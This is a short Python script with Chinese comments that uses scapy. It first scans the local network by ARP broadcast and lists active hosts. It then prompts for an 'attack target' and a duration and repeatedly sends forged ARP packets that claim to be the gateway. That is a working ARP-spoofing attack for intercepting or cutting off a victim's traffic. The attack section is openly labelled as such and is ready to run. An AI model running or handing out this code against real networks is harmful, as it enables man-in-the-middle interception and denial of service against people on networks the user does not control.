# 局域网扫描器,使用ARP扫描
from scapy.all import *
import time
import json
from django.http import HttpResponse
import socket


wifi = 'Intel(R) Dual Band Wireless-AC 3165'
# 扫描局域网，显示活跃主机
for line in os.popen('route print'):
    s = line.strip()  # 去掉每行的空格
    if s.startswith('0.0.0.0'):
        slist = s.split()
        ip = slist[3]  # 本机IP
        gw = slist[2]  # 本机网关
        break
print('本机上网的IP是：', ip)
print('本机上网的网关是：', gw)
tnet = gw + '/24'  # 本网络

# 构造一个ARP广播包，向整个网络的每台主机发起ARP广播
p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=tnet)
# ans 表示收到的包的回复
ans, unans = srp(p, iface=wifi, timeout=2, verbose=0)
print("一共扫描到%d台主机：" % len(ans))
# 将需要的IP地址和Mac地址存放在result列表中
result = []
for s, r in ans:
    # 解析收到的包，提取出需要的IP地址和MAC地址
    result.append([r[ARP].psrc, r[ARP].hwsrc])
result.sort()
# 打印出活跃主机的IP地址和MAC地址
for ip, mac in result:
    print(ip, "------>", mac)



# target = request.POST.get("number")
# print(t)
# t = request.POST.get("number")
# print("函数开始执行")


target = input("请输入攻击目标：")
t = int(input("请输入攻击时间（S）:"))

# 构造一个欺骗数据包，告诉被攻击者，我是网关
p1 = Ether(dst='ff:ff:ff:ff:ff:ff', src='14:4f:8a:69:0e:a6') / ARP(pdst=target, psrc=gw)
# 周期性的发包,欺骗模式
print("攻击开始。。。")
for i in range(10 * int(t)):
    sendp(p1, verbose=0)
    time.sleep(0.1)
print("攻击结束。。。")